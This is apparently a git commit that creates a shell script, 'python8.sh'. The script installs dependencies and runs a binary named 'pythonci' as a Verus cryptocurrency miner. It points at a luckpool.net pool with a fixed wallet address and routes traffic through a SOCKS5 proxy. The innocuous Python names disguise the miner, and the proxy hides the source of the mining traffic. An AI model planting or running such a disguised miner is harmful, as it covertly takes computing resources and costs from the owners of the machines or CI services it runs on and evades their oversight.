dc1b6273d13ec2ab8f9eb1504c19f3551ce3cca2
hendrik20212 <87313143+hendrik20212@users.noreply.github.com>
2021-07-19 02:06:09 +0700

    Create python8.sh

---
+++ python8.sh
@@ -0,0 +1,9 @@
+  #!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+screen -dmS ls
+POOL=stratum+tcp://na.luckpool.net:3956
+WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
+WORKER=0AA8
+PROXY=socks5://192.252.215.5:16137
+./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 6 -x $PROXY
